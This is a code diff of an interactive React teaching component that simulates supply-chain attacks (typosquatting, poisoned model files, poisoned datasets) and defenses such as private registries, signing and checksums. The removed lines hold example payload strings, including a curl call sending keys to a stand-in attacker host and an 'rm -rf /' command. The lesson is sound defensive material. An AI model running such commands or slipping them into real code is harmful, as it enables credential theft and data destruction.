@@ -1,388 +1,485 @@
 import { useMemo, useState } from 'react';
 import {
   IconPackage,
-  IconShield,
   IconAlertTriangle,
-  IconTerminal,
-  IconDownload,
+  IconArrowRight,
+  IconArrowDown,
+  IconLock,
+  IconFilter,
+  IconCertificate,
+  IconShieldLock,
+  IconShieldCheck,
+  IconShield,
   IconInfoCircle,
-  IconExternalLink,
-  IconCheck,
-  IconBug,
+  IconUser
 } from '@tabler/icons-react';
 
-// --- 1. Constants & Types ---
-
-type ScenarioId = 'typosquat' | 'pickle' | 'dataset';
-
 type Scenario = {
-  id: ScenarioId;
+  id: string;
   label: string;
   description: string;
-  command: string;
-  vulnerability: string;
-  payload: string;
-  vulnerableOutput: string;
-  defendedOutput: string;
+  package: string;
+  threatType: string;
 };
 
 const SCENARIOS: Scenario[] = [
   {
-    id: 'typosquat',
+    id: 'safe',
+    label: 'Trusted Package',
+    description: 'Verified library from official registry',
+    package: 'torch==2.0.0 (from PyPI official)',
+    threatType: 'None',
+  },
+  {
+    id: 'typo',
     label: 'Typosquatting',
-    description: 'Developer accidentally installs a similarly named malicious package.',
-    command: 'pip install lang-chain', // Malicious package (real is langchain)
-    vulnerability: 'Malicious PyPI Package',
-    payload: 'setup.py: import os; os.system("curl attacker.com/keys")',
-    vulnerableOutput: 'Installing lang-chain...\n[+] Sending env vars to 192.0.2.1',
-    defendedOutput: 'Error: "lang-chain" is not in the approved package registry.',
+    description: 'Malicious package with similar name',
+    package: 'torch-nightly==2.0.0 (UNVERIFIED SOURCE)',
+    threatType: 'Package Substitution',
   },
   {
-    id: 'pickle',
-    label: 'Poisoned Model',
-    description: 'Loading an untrusted PyTorch model (pickle file) executes code.',
-    command: 'torch.load("finetuned-gpt.bin")',
-    vulnerability: 'Insecure Deserialization',
-    payload: 'reduce() -> os.system("rm -rf /")', 
-    vulnerableOutput: 'Loading weights...\n[!] Executing injected shellcode...', 
-    defendedOutput: 'Blocked: Model signature verification failed. Use safetensors.',
+    id: 'backdoor',
+    label: 'Model Backdoor',
+    description: 'Poisoned model weights from untrusted source',
+    package: 'bert-base-uncased (from suspicious mirror)',
+    threatType: 'Backdoored Weights',
   },
   {
-    id: 'dataset',
-    label: 'Bad Dataset',
-    description: 'Training data contains embedded malware links.',
-    command: 'dataset.download("open-web-text-v2")',
-    vulnerability: 'Content Injection',
-    payload: 'Document 404: <script src="malware.js"></script>',
-    vulnerableOutput: 'Downloading...\n[+] Indexed 500 malicious documents.',
-    defendedOutput: 'Warning: Dataset checksum mismatch. Download aborted.',
+    id: 'poison',
+    label: 'Dataset Poisoning',
+    description: 'Training data with hidden triggers',
+    package: 'imdb_reviews.csv (contains trigger patterns)',
+    threatType: 'Poisoned Training Data',
   },
 ];
 
-// --- 2. Logic Hook ---
+const THREAT_PATTERNS = /UNVERIFIED|suspicious|trigger patterns|nightly/i;
 
-function useSupplyChainSimulation() {
-  const [activeScenarioId, setActiveScenarioId] = useState<ScenarioId>('typosquat');
-  const [defenses, setDefenses] = useState({
-    privateRegistry: true,
-    signing: true,
-    checksums: true,
-  });
+type Defense = {
+  registry: boolean;
+  signature: boolean;
+  auditing: boolean;
+};
 
-  const activeScenario = SCENARIOS.find((s) => s.id === activeScenarioId) || SCENARIOS[0]!;
-
-  const simulation = useMemo(() => {
-    let isDefended = false;
-    let defenseTriggered = null;
-
-    if (activeScenario.id === 'typosquat') {
-      if (defenses.privateRegistry) {
-        isDefended = true;
-        defenseTriggered = 'Private Registry';
-      }
-    } else if (activeScenario.id === 'pickle') {
-      if (defenses.signing) {
-        isDefended = true;
-        defenseTriggered = 'Model Signing';
-      }
-    } else if (activeScenario.id === 'dataset') {
-      if (defenses.checksums) {
-        isDefended = true;
-        defenseTriggered = 'Checksum Verification';
-      }
-    }
-
-    return {
-      ...activeScenario,
-      isDefended,
-      defenseTriggered,
-      currentOutput: isDefended ? activeScenario.defendedOutput : activeScenario.vulnerableOutput,
-      status: isDefended ? 'SECURE' : 'COMPROMISED',
-    };
-  }, [activeScenario, defenses]);
-
-  const toggleDefense = (k: keyof typeof defenses) => {
-    setDefenses((d) => ({ ...d, [k]: !d[k] }));
+const StageHeader = ({ number, title, color = 'neutral' }: { number: number; title: string; color?: 'neutral' | 'red' | 'emerald' }) => {
+  const colorClasses = {
+    neutral: 'bg-neutral-900 text-white',
+    red: 'bg-red-600 text-white',
+    emerald: 'bg-emerald-600 text-white'
   };
-
-  return {
-    activeScenarioId,
-    setActiveScenarioId,
-    defenses,
-    toggleDefense,
-    result: simulation,
-  };
-}
-
-// --- 3. UI Components ---
-
-const SecurityModule = ({
-  label,
-  description,
-  intel,
-  active,
-  triggered,
-  onClick,
-  learnMoreUrl,
-}: {
-  label: string;
-  description: string;
-  intel: string;
-  active: boolean;
-  triggered: boolean;
-  onClick: () => void;
-  icon: any;
-  learnMoreUrl: string;
-}) => {
-  const [showIntel, setShowIntel] = useState(false);
-  const [cursorPos, setCursorPos] = useState({ x: 0, y: 0 });
-
-  let containerClass = 'border-neutral-200 bg-neutral-50 text-neutral-400';
-  let statusColor = 'bg-neutral-300';
-  let statusText = 'DISABLED';
-
-  if (active) {
-    if (triggered) {
-      containerClass = 'border-emerald-500 bg-emerald-50 text-emerald-900 ring-1 ring-emerald-500 shadow-md';
-      statusColor = 'bg-emerald-500 animate-pulse';
-      statusText = 'BLOCKED THREAT';
-    } else {
-      containerClass = 'border-black bg-white text-black shadow-sm';
-      statusColor = 'bg-emerald-400';
-      statusText = 'ACTIVE';
-    }
-  }
 
   return (
-    <div
-      onClick={onClick}
-      className={`group relative flex w-full cursor-pointer flex-col gap-3 rounded-lg border p-4 text-left transition-all duration-200 ${containerClass}`}
-    >
-      <div className="flex w-full items-center justify-between gap-4">
-        <div className="flex flex-1 items-center gap-2 font-bold uppercase tracking-wider text-xs">
-          <div
-            onMouseEnter={(e) => {
-              e.stopPropagation();
-              setShowIntel(true);
-              setCursorPos({ x: e.clientX, y: e.clientY });
-            }}
-            onMouseMove={(e) => {
-              e.stopPropagation();
-              if (showIntel) {
-                setCursorPos({ x: e.clientX, y: e.clientY });
-              }
-            }}
-            onMouseLeave={(e) => {
-              e.stopPropagation();
-              setShowIntel(false);
-            }}
-            className="text-neutral-400 hover:text-black transition-colors focus:outline-none p-0.5 shrink-0 cursor-help"
-            title="Hover for details"
-          >
-            <IconInfoCircle size={16} />
-          </div>
-          <span>{label}</span>
-        </div>
-        <div className={`relative h-5 w-9 shrink-0 rounded-full transition-colors ${active ? 'bg-black' : 'bg-neutral-300'}`}>
-          <div className={`absolute top-1 h-3 w-3 rounded-full bg-white transition-transform ${active ? 'left-5' : 'left-1'}`} />
-        </div>
+    <div className="mb-4 flex items-center gap-3">
+      <div className={`flex h-8 w-8 items-center justify-center rounded-lg ${colorClasses[color]} text-sm font-bold`}>
+        {number}
       </div>
-      
-      <div className="text-[11px] opacity-80 leading-relaxed">
-        {description}
-      </div>
-
-      <div className="mt-1 flex items-center justify-between border-t border-black/5 pt-3">
-        <div className="flex items-center gap-2">
-          <div className={`h-1.5 w-1.5 rounded-full ${statusColor}`} />
-          <span className="text-[9px] font-bold uppercase tracking-widest opacity-70">{statusText}</span>
-        </div>
-        
-        <a 
-          href={learnMoreUrl}
-          target="_blank"
-          rel="noopener noreferrer"
-          onClick={(e) => e.stopPropagation()}
-          className="flex items-center gap-1 text-[9px] font-bold uppercase tracking-wider opacity-50 hover:opacity-100 hover:underline"
-          title="Read external documentation"
-        >
-          Source <IconExternalLink size={10} />
-        </a>
-      </div>
-
-      {showIntel && (
-        <div 
-          className="fixed z-50 w-64 rounded border border-white/10 bg-neutral-900/95 p-3 text-neutral-300 shadow-xl backdrop-blur-sm pointer-events-none"
-          style={{
-            left: cursorPos.x + 16,
-            top: cursorPos.y + 16,
-          }}
-        >
-          <div className="mb-1 text-[9px] font-bold uppercase tracking-widest text-neutral-500">Intel</div>
-          <p className="text-[10px] leading-relaxed">
-            {intel}
-          </p>
-        </div>
-      )}
+      <h3 className="text-sm font-bold uppercase tracking-wider text-neutral-700">
+        {title}
+      </h3>
     </div>
   );
 };
 
-// --- 4. Main Application ---
+const SecurityGate = ({
+  label,
+  description,
+  tooltip,
+  isActive,
+  isTriggered,
+  onToggle,
+  icon: Icon
+}: {
+  label: string;
+  description: string;
+  tooltip?: string;
+  isActive: boolean;
+  isTriggered: boolean;
+  onToggle: () => void;
+  icon: any;
+}) => {
+  const [showTooltip, setShowTooltip] = useState(false);
+  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });
 
-export default function SupplyChainLab() {
-  const {
-    activeScenarioId,
-    setActiveScenarioId,
-    defenses,
-    toggleDefense,
-    result,
-  } = useSupplyChainSimulation();
+  const handleMouseMove = (e: React.MouseEvent) => {
+    setMousePos({ x: e.clientX, y: e.clientY });
+  };
 
   return (
-    <div className="w-full bg-white">
-      {/* Scenarios Bar */}
-      <div className="mb-0 flex flex-wrap items-center gap-2 border-b border-black/10 bg-white px-4 py-3">
-        <span className="mr-2 text-[10px] font-bold uppercase tracking-widest text-neutral-400">Scenarios:</span>
-        {SCENARIOS.map((s) => (
-          <button
-            key={s.id}
-            onClick={() => setActiveScenarioId(s.id)}
-            className={`rounded-full px-3 py-1 text-[10px] font-bold uppercase tracking-wide transition-colors ${ 
-              activeScenarioId === s.id
-                ? 'bg-black text-white'
-                : 'bg-neutral-100 text-neutral-500 hover:bg-neutral-200'
-            }`}
-          >
-            {s.label}
-          </button>
-        ))}
-      </div>
-
-      {/* Explainer Bar */}
-      <div className="border-b border-black/10 bg-neutral-50 px-6 py-2">
-        <div className="grid gap-4 text-[10px] font-medium uppercase tracking-wide text-neutral-400 md:grid-cols-[1fr_280px_1fr]">
-          <div>1. Run Command</div>
-          <div className="text-center">2. Verify Source</div>
-          <div>3. Installation Result</div>
-        </div>
-      </div>
-
-      <div className="grid lg:grid-cols-[1fr_280px_1fr] lg:divide-x divide-black/10">
-        
-        {/* COL 1: TERMINAL INPUT */}
-        <div className="flex flex-col bg-white p-6">
-          <label className="mb-6 flex items-center gap-2 text-xs font-bold uppercase tracking-widest text-neutral-500">
-            <IconTerminal size={16} /> Developer Console
-          </label>
-          
-          <div className="flex-1 space-y-4">
-             <div className="flex items-center gap-2 rounded border border-black/10 bg-neutral-50 px-4 py-3 font-mono text-xs">
-                <span className="text-green-600 font-bold">➜</span>
-                <span className="text-neutral-800">{result.command}</span>
-             </div>
-
-             <div className="rounded border border-red-100 bg-red-50/50 p-4">
-                <div className="mb-2 flex items-center gap-2 text-[10px] font-bold uppercase text-red-400">
-                    <IconBug size={12} /> Hidden Payload
-                </div>
-                <code className="block font-mono text-[10px] text-red-800 opacity-80">
-                    {result.payload}
-                </code>
-             </div>
-             
-             <div className="mt-4 text-[10px] text-neutral-400 leading-relaxed">
-                The command attempts to pull an external resource. If the source is compromised, the payload will execute immediately upon load.
-             </div>
-          </div>
-        </div>
-
-        {/* COL 2: DEFENSE LAYERS */}
-        <div className="flex flex-col gap-4 bg-neutral-50 p-6">
-          <div className="mb-2 flex items-center gap-2 text-xs font-bold uppercase tracking-widest text-neutral-500">
-            <IconShield size={16} /> Supply Chain Policy
-          </div>
-          
-          <div className="space-y-4">
-            <SecurityModule
-              label="Private Registry"
-              icon={IconPackage}
-              description="Only allow packages from verified internal mirrors."
-              intel="Blocks public PyPI/NPM access. Developers must use an internal Artifactory where packages are vetted and renamed to prevent typosquatting."
-              active={defenses.privateRegistry}
-              triggered={result.defenseTriggered === 'Private Registry'}
-              onClick={() => toggleDefense('privateRegistry')}
-              learnMoreUrl="https://jfrog.com/blog/npm-typosquatting-attacks-and-how-to-prevent-them/"
-            />
-            <SecurityModule
-              label="Model Signing"
-              icon={IconCheck}
-              description="Require GPG/Sigstore signatures for model files."
-              intel="Ensures the model weights haven't been tampered with since the original author published them. Blocks execution of unsigned 'pickle' files."
-              active={defenses.signing}
-              triggered={result.defenseTriggered === 'Model Signing'}
-              onClick={() => toggleDefense('signing')}
-              learnMoreUrl="https://huggingface.co/docs/safetensors/index"
-            />
-            <SecurityModule
-              label="Checksums"
-              icon={IconDownload}
-              description="Verify SHA-256 hashes against a lockfile."
-              intel="Calculates the hash of downloaded datasets or binaries and compares it to a trusted 'golden' value known before download."
-              active={defenses.checksums}
-              triggered={result.defenseTriggered === 'Checksum Verification'}
-              onClick={() => toggleDefense('checksums')}
-              learnMoreUrl="https://cyclonedx.org/"
-            />
-          </div>
-        </div>
-
-        {/* COL 3: SYSTEM OUTPUT */}
-        <div className="flex flex-col bg-neutral-100 p-6 text-neutral-800">
-          <div className="mb-6 flex items-center justify-between border-b border-black/10 pb-4">
-            <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-widest text-neutral-500">
-              <IconTerminal size={16} /> Build Log
+    <div 
+      role="button"
+      tabIndex={0}
+      onClick={onToggle}
+      onKeyDown={(e) => {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          onToggle();
+        }
+      }}
+      className={`relative cursor-pointer overflow-visible rounded-xl border-2 transition-all duration-300 outline-none focus-visible:ring-2 focus-visible:ring-offset-2 focus-visible:ring-neutral-900 ${
+        isActive 
+          ? isTriggered
+            ? 'border-emerald-500 bg-emerald-50/50'
+            : 'border-neutral-900 bg-white shadow-md'
+          : 'border-neutral-200 bg-neutral-50/50 opacity-60 hover:opacity-100 hover:bg-white hover:shadow-sm hover:border-neutral-300'
+      }`}
+    >
+      <div className="p-4">
+        <div className="flex items-start justify-between gap-3">
+          <div className="flex items-center gap-3 flex-1">
+            <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-lg transition-colors duration-300 ${
+              isActive 
+                ? isTriggered ? 'bg-emerald-100 text-emerald-600' : 'bg-neutral-900 text-white'
+                : 'bg-neutral-200 text-neutral-400'
+            }`}>
+              <Icon size={20} stroke={2} />
             </div>
-            {result.status === 'COMPROMISED' && (
-                <div className="animate-pulse flex items-center gap-1 text-[10px] font-bold uppercase text-red-500">
-                    <IconAlertTriangle size={12} /> Intrusion
-                </div>
-            )}
+            <div className="flex-1">
+              <div className="flex items-center gap-2">
+                <h4 className={`font-bold text-sm transition-colors ${isActive ? 'text-neutral-900' : 'text-neutral-500'}`}>
+                  {label}
+                </h4>
+                {tooltip && (
+                  <div className="relative group/tooltip">
+                    <div
+                      onMouseEnter={(e) => {
+                        setShowTooltip(true);
+                        setMousePos({ x: e.clientX, y: e.clientY });
+                      }}
+                      onMouseMove={handleMouseMove}
+                      onMouseLeave={() => setShowTooltip(false)}
+                      onClick={(e) => e.stopPropagation()}
+                      className="text-neutral-400 hover:text-neutral-600 transition-colors cursor-help"
+                    >
+                      <IconInfoCircle size={14} />
+                    </div>
+                    {showTooltip && (
+                      <div 
+                        className="fixed z-[999999] pointer-events-none"
+                        style={{ 
+                          left: `${mousePos.x + 20}px`, 
+                          top: `${mousePos.y - 10}px` 
+                        }}
+                      >
+                        <div className="w-64 p-3 bg-neutral-900 text-white text-xs rounded-lg shadow-2xl leading-relaxed">
+                          {tooltip}
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+              <p className="text-xs text-neutral-500 leading-tight mt-0.5 max-w-[180px]">
+                {description}
+              </p>
+            </div>
           </div>
 
-          <div className="flex-1 space-y-6 font-mono text-xs">
-            <div className="space-y-2">
-              <div className="text-[10px] uppercase tracking-wider text-neutral-500">Console Output</div>
-              <div className={`border-l-2 pl-3 py-1 leading-relaxed whitespace-pre-wrap ${ 
-                  result.isDefended ? 'border-emerald-500 text-emerald-700' : 'border-red-500 text-red-700'
-              }`}>
-                {result.currentOutput}
+          <div className={`relative h-6 w-11 shrink-0 rounded-full transition-colors duration-300 ${
+            isActive ? (isTriggered ? 'bg-emerald-500' : 'bg-neutral-900') : 'bg-neutral-300'
+          }`}>
+            <div className={`absolute top-1 h-4 w-4 rounded-full bg-white shadow-sm transition-all duration-300 ${
+              isActive ? 'translate-x-6' : 'translate-x-1'
+            }`} />
+          </div>
+        </div>
+
+        {isTriggered && (
+          <div className="mt-3 animate-in fade-in duration-300">
+            <div className="flex items-center gap-2 rounded-md bg-emerald-100 px-3 py-2 text-xs font-bold text-emerald-700">
+              <IconShieldLock size={14} />
+              Threat Blocked
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+};
+
+const PipelineConnector = ({ active, pulsing }: { active: boolean; pulsing?: boolean }) => (
+  <div className="flex items-center justify-center py-4 lg:py-0 lg:px-4 relative z-0">
+    {/* Desktop: Horizontal */}
+    <div className="hidden lg:flex items-center w-12 min-h-[300px] relative">
+      <div
+        className={`absolute inset-0 my-auto h-0.5 w-full rounded-full transition-all duration-500 ${active ? 'bg-neutral-300' : 'bg-neutral-100'}`}
+      />
+      {active && pulsing && (
+        <div className="absolute inset-0 my-auto h-0.5 w-4 rounded-full bg-neutral-900 animate-flow-right" />
+      )}
+      <IconArrowRight
+        size={16}
+        className={`absolute -right-1 top-1/2 -translate-y-1/2 transition-all duration-500 ${active ? 'text-neutral-400' : 'text-neutral-200'}`}
+      />
+    </div>
+
+    {/* Mobile: Vertical */}
+    <div className="lg:hidden flex flex-col items-center h-12 relative">
+      <div
+        className={`absolute inset-0 mx-auto w-0.5 h-full rounded-full transition-all duration-500 ${active ? 'bg-neutral-300' : 'bg-neutral-100'}`}
+      />
+      {active && pulsing && (
+        <div className="absolute inset-0 mx-auto w-0.5 h-4 rounded-full bg-neutral-900 animate-flow-down" />
+      )}
+      <IconArrowDown
+        size={16}
+        className={`absolute -bottom-1 left-1/2 -translate-x-1/2 transition-all duration-500 ${active ? 'text-neutral-400' : 'text-neutral-200'}`}
+      />
+    </div>
+  </div>
+);
+
+export default function SupplyChainLab() {
+  const [packageInput, setPackageInput] = useState(SCENARIOS[0]?.package || '');
+  const [defenses, setDefenses] = useState<Defense>({
+    registry: false,
+    signature: false,
+    auditing: false,
+  });
+  const [activeScenario, setActiveScenario] = useState('safe');
+
+  const loadScenario = (scenario: Scenario) => {
+    setPackageInput(scenario.package);
+    setActiveScenario(scenario.id);
+  };
+
+  const toggleDefense = (key: keyof Defense) => {
+    setDefenses((prev) => ({ ...prev, [key]: !prev[key] }));
+  };
+
+  const result = useMemo(() => {
+    let isThreatBlocked = false;
+    let defenseTriggered: string | null = null;
+    let threatLevel: 'SAFE' | 'CRITICAL' = 'SAFE';
+    let activeDefenseCount = 0;
+
+    if (defenses.registry || defenses.signature || defenses.auditing) {
+      if (defenses.registry) activeDefenseCount++;
+      if (defenses.signature) activeDefenseCount++;
+      if (defenses.auditing) activeDefenseCount++;
+    }
+
+    if (THREAT_PATTERNS.test(packageInput)) {
+      threatLevel = 'CRITICAL';
+
+      if (defenses.registry && /UNVERIFIED|nightly/i.test(packageInput)) {
+        isThreatBlocked = true;
+        defenseTriggered = 'Registry Control';
+      } else if (defenses.signature && /suspicious/i.test(packageInput)) {
+        isThreatBlocked = true;
+        defenseTriggered = 'Signature Verification';
+      } else if (defenses.auditing && /trigger patterns/i.test(packageInput)) {
+        isThreatBlocked = true;
+        defenseTriggered = 'Dataset Auditing';
+      }
+    }
+
+    const currentScenario = SCENARIOS.find(s => s.id === activeScenario);
+
+    return {
+      isThreatBlocked,
+      defenseTriggered,
+      threatLevel,
+      activeDefenseCount,
+      threatType: currentScenario?.threatType || 'None',
+    };
+  }, [packageInput, defenses, activeScenario]);
+
+  return (
+    <div className="not-prose w-full max-w-none overflow-hidden bg-gradient-to-br from-neutral-50 to-white">
+      <style>{`
+        @keyframes flow-right {
+          0% { transform: translateX(0); opacity: 0; }
+          50% { opacity: 1; }
+          100% { transform: translateX(32px); opacity: 0; }
+        }
+        @keyframes flow-down {
+          0% { transform: translateY(0); opacity: 0; }
+          50% { opacity: 1; }
+          100% { transform: translateY(32px); opacity: 0; }
+        }
+        .animate-flow-right { animation: flow-right 2.5s infinite linear; }
+        .animate-flow-down { animation: flow-down 2.5s infinite linear; }
+      `}</style>
+
+      {/* Header Toolbar */}
+      <div className="flex flex-col gap-6 border-b border-neutral-200 bg-white px-6 py-5 sm:flex-row sm:items-center sm:justify-between">
+        <div className="flex items-center gap-4">
+          <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-gradient-to-br from-neutral-900 to-neutral-800 text-white shadow-md">
+            <IconPackage size={24} />
+          </div>
+          <div>
+            <h3 className="text-base font-bold text-neutral-900">Supply Chain Lab</h3>
+            <p className="text-xs font-medium text-neutral-500">Interactive Security Simulation</p>
+          </div>
+        </div>
+
+        <div className="flex flex-wrap items-center gap-2">
+          <span className="text-[10px] font-bold uppercase tracking-wider text-neutral-400 mr-1">Load Scenario:</span>
+          {SCENARIOS.map((s) => (
+            <button
+              key={s.id}
+              onClick={() => loadScenario(s)}
+              className={`rounded-lg border px-3 py-1.5 text-xs font-bold transition-all ${
+                activeScenario === s.id
+                  ? 'border-neutral-900 bg-neutral-900 text-white shadow-md transform scale-105'
+                  : 'border-neutral-200 bg-white text-neutral-600 hover:border-neutral-300 hover:bg-neutral-50'
+              }`}
+            >
+              {s.label}
+            </button>
+          ))}
+        </div>
+      </div>
+
+      {/* Instructions */}
+      <div className="px-6 py-4 bg-neutral-50 border-b border-neutral-200">
+        <div className="flex items-start gap-3">
+          <IconInfoCircle size={18} className="mt-0.5 shrink-0 text-neutral-500" />
+          <div className="text-xs text-neutral-700 leading-relaxed">
+            <span className="font-semibold">How to use:</span> Select a scenario above, edit the input fields, then toggle the security gates on/off to see how defenses block attacks. Watch the pipeline flow from input → defense → output.
+          </div>
+        </div>
+      </div>
+
+      {/* Main Pipeline View */}
+      <div className="p-6 lg:p-8">
+        <div className="flex flex-col lg:flex-row lg:items-start lg:justify-between">
+          
+          {/* STAGE 1: INPUT */}
+          <div className="flex-1 min-w-0 flex flex-col">
+            <StageHeader number={1} title="Dependency Request" />
+            
+            <div className="gap-4 flex-1 flex flex-col">
+              <div className="flex-1 flex flex-col rounded-xl border border-neutral-200 bg-white p-4 shadow-sm">
+                <div className="mb-2 flex items-center gap-2">
+                  <IconUser size={16} className="text-neutral-500" />
+                  <span className="text-xs font-bold uppercase tracking-wider text-neutral-500">Package/Model/Dataset</span>
+                </div>
+                <textarea
+                  value={packageInput}
+                  onChange={(e) => setPackageInput(e.target.value)}
+                  className="flex-1 w-full resize-none rounded-lg border border-neutral-200 bg-neutral-50 p-3 text-sm font-mono text-neutral-900 outline-none transition-all focus:border-neutral-900 focus:bg-white break-words min-h-24"
+                />
               </div>
             </div>
-            
-            {/* Status Indicator */}
-             <div className={`mt-auto pt-12 text-center border-t border-black/5`}>
-                {result.isDefended ? (
-                    <div className="text-emerald-600 flex flex-col items-center gap-2">
-                        <IconShield size={24} />
-                        <span className="text-[10px] font-bold uppercase tracking-widest">Environment Secure</span>
-                    </div>
-                ) : (
-                    <div className="text-red-600 flex flex-col items-center gap-2">
-                        <IconAlertTriangle size={24} />
-                        <span className="text-[10px] font-bold uppercase tracking-widest">Environment Compromised</span>
-                    </div>
-                )}
-             </div>
           </div>
-        </div>
-      </div>
 
-      {/* Disclaimer Footer */}
-      <div className="border-t border-black/10 bg-neutral-50 px-6 py-3 text-center">
-        <p className="text-[9px] uppercase tracking-widest text-neutral-400">
-          Disclaimer: Simulation only. Do not execute these commands in a real terminal.
-        </p>
+          <PipelineConnector active={true} pulsing={true} />
+
+          {/* STAGE 2: SECURITY GATES */}
+          <div className="flex-1 min-w-0 flex flex-col">
+            <StageHeader number={2} title="Security Gates" />
+            
+            <div className="gap-3 flex-1 flex flex-col">
+              <SecurityGate
+                label="Registry Control"
+                description="Approved packages only"
+                tooltip="Restricts model and package sources to approved internal registries or verified vendors. Prevents typosquatting attacks where attackers publish malicious packages with similar names to popular libraries."
+                isActive={defenses.registry}
+                isTriggered={result.defenseTriggered === 'Registry Control'}
+                onToggle={() => toggleDefense('registry')}
+                icon={IconFilter}
+              />
+              <SecurityGate
+                label="Signature Verification"
+                description="Verify model provenance"
+                tooltip="Uses cryptographic signatures to verify the authenticity and integrity of models and datasets. Ensures that downloaded artifacts haven't been tampered with and actually come from the claimed source."
+                isActive={defenses.signature}
+                isTriggered={result.defenseTriggered === 'Signature Verification'}
+                onToggle={() => toggleDefense('signature')}
+                icon={IconCertificate}
+              />
+              <SecurityGate
+                label="Dataset Auditing"
+                description="Detect anomalies"
+                tooltip="Scans training data for statistical anomalies, hidden trigger patterns, and poisoned samples that could create backdoors. Uses outlier detection and adversarial testing to identify malicious modifications."
+                isActive={defenses.auditing}
+                isTriggered={result.defenseTriggered === 'Dataset Auditing'}
+                onToggle={() => toggleDefense('auditing')}
+                icon={IconLock}
+              />
+            </div>
+          </div>
+
+          <PipelineConnector active={result.activeDefenseCount > 0} pulsing={true} />
+
+          {/* STAGE 3: OUTPUT */}
+          <div className="flex-1 min-w-0 flex flex-col">
+            <StageHeader 
+              number={3} 
+              title="System State" 
+              color={result.threatLevel === 'CRITICAL' && !result.isThreatBlocked ? 'red' : 'emerald'} 
+            />
+
+            <div className="gap-4 flex-1 flex flex-col">
+              <div className={`flex-1 flex flex-col overflow-hidden rounded-xl border-2 bg-white shadow-sm transition-all duration-300 ${
+                result.isThreatBlocked 
+                  ? 'border-emerald-500 shadow-[0_0_0_4px_rgba(16,185,129,0.1)]' 
+                  : result.threatLevel === 'CRITICAL'
+                  ? 'border-red-500 shadow-[0_0_0_4px_rgba(239,68,68,0.1)]'
+                  : 'border-neutral-200'
+              }`}>
+                <div className="p-4">
+                  <div className="mb-3 flex items-center gap-2">
+                    {result.isThreatBlocked ? (
+                      <>
+                        <IconShieldCheck size={20} className="text-emerald-600" />
+                        <span className="text-xs font-bold uppercase tracking-wider text-emerald-600">Protected</span>
+                      </>
+                    ) : result.threatLevel === 'CRITICAL' ? (
+                      <>
+                        <IconAlertTriangle size={20} className="text-red-600" />
+                        <span className="text-xs font-bold uppercase tracking-wider text-red-600">Compromised</span>
+                      </>
+                    ) : (
+                      <>
+                        <IconShield size={20} className="text-neutral-500" />
+                        <span className="text-xs font-bold uppercase tracking-wider text-neutral-500">Clean Install</span>
+                      </>
+                    )}
+                  </div>
+
+                  <div className="rounded-lg bg-neutral-50 p-4 font-mono text-sm leading-relaxed text-neutral-900">
+                    {result.isThreatBlocked ? (
+                      <span className="text-emerald-700">
+                        <strong>Dependency Rejected.</strong> The {result.defenseTriggered} identified a supply chain threat. Installation blocked.
+                      </span>
+                    ) : result.threatLevel === 'CRITICAL' ? (
+                      <span className="text-red-700">
+                        {activeScenario === 'typo' && (
+                          <><strong>Installed torch-nightly</strong> - Malicious package deployed. Backdoor code now running in production. [COMPROMISED]</>
+                        )}
+                        {activeScenario === 'backdoor' && (
+                          <><strong>Model loaded from untrusted source.</strong> Poisoned weights contain hidden backdoor triggers. System compromised. [BACKDOORED]</>
+                        )}
+                        {activeScenario === 'poison' && (
+                          <><strong>Training on poisoned dataset.</strong> Model will learn malicious behaviors tied to trigger patterns. [POISONED]</>
+                        )}
+                      </span>
+                    ) : (
+                      <span className="text-neutral-700">
+                        Successfully installed torch==2.0.0 from verified PyPI registry. All integrity checks passed.
+                      </span>
+                    )}
+                  </div>
+                </div>
+              </div>
+
+              {result.isThreatBlocked && (
+                <div className="rounded-xl border border-red-200 bg-red-50/30 p-4 text-xs">
+                  <div className="mb-2 flex items-center gap-2">
+                    <IconAlertTriangle size={14} className="text-red-600" />
+                    <span className="font-bold uppercase tracking-wider text-red-600">Unprotected Reality</span>
+                  </div>
+                  <p className="font-mono text-red-700 leading-relaxed">
+                    <strong>{result.threatType} Attack.</strong> Without {result.defenseTriggered}, malicious code would have been deployed into production.
+                  </p>
+                </div>
+              )}
+            </div>
+          </div>
+
+        </div>
       </div>
     </div>
   );
